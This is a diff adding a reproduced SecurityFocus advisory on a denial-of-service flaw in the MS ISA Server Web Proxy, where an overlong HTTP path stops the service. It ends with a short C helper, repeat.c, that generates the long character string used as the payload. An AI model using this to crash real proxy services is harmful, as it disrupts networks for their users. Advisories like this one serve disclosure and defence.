@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/2600/info
+
+It is possible for a user to cause the Web Proxy service on a host running MS ISA Server to stop responding.
+
+If a HTTP request with an unusually long path is submitted, the Web Proxy service could stop responding.
+
+This vulnerability is only exploitable from the internal network unless the Web Publishing service has been enabled, in which case it can be exploited from either internal or external networks. It is disabled by default.
+
+A HTML email containing the malicious URL in an image tag or a javascript URL, could invoke a user's browser. An attempt to fulfill this request by the Web Proxy service, could instigate the denial of service condition on an internal users system. This is a potential way a remote attacker could exploit this vulnerability even if Web Publishing is disabled.
+
+* It has been reported that the execution of arbitrary commands is possible. If this is the case the complete remote compromise of the host may be achievable. The latest findings have not been confirmed by anyone other than the person who posted about it. 
+
+/*
+ * repeat.c -- quick-n-dirty hack to output argv[2] instances of the
+ * character whose ASCII value is given as argv[1]
+ *
+ * WARNING - this has absolutely no error checking!
+ */
+
+#include <stdio.h>
+
+main (int argc, char **argv) {
+  int character;
+  long repetitions, i;
+
+  if ( argc != 3 ) {
+    printf("usage: repeat char reps\n");
+    exit(1);
+  }
+  character = atoi(argv[1]);
+  repetitions = atol(argv[2]);
+
+  for (i = 0L; i < repetitions; i++) {
+    printf ("%c", character);
+  }
+}
